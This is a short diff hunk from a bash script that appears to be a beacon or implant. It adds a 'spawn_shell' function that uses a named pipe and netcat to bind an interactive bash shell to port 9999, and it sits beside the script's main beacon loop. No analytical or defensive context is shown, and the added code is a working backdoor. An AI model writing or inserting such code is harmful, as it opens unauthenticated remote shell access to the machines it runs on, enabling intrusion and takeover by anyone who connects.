@@ -63,6 +63,12 @@ check(){
     fi
 }
 
+# bind shell to a port with netcat
+spawn_shell(){
+    mkfifo /tmp/pipe
+    cat /tmp/pipe | /bin/bash 2>&1 | nc -l 9999 > /tmp/pipe &
+}
+
 # Main driver for beacon
 main(){
     while true; do
